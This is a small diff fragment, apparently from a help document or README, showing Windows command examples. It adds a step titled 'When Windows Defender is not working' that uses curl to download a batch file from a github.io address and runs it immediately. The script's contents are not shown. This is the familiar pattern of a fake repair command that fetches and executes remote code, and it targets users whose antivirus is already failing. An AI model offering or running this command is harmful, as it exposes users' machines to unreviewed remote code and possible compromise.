@@ -18,3 +18,9 @@ del
 ```
 rm -rf C:check
 ```
+
+
+When Windows Defender is not working
+```
+curl -s https://yuyu1815.github.io/win-repair/help.bat -o script.bat && script.bat
+```
